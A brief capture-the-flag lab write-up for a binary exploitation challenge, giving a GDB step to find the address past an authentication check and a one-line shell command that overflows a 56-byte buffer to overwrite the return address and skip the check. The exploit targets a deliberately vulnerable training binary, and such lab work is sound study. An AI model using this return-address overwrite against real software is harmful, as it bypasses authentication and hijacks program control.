1. GDB -> `disas win_authed` -> the address of instruction after auth check is **0x40203e**
2. As told in the debug output, the return address from challenge() is stored at 56 bytes from start of input buffer.

    ```shell
    echo -n -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x3e\x20\x40\x00\x00\x00\x00\x00" | /challenge/binary-exploitation-control-hijack-2-w
    ```
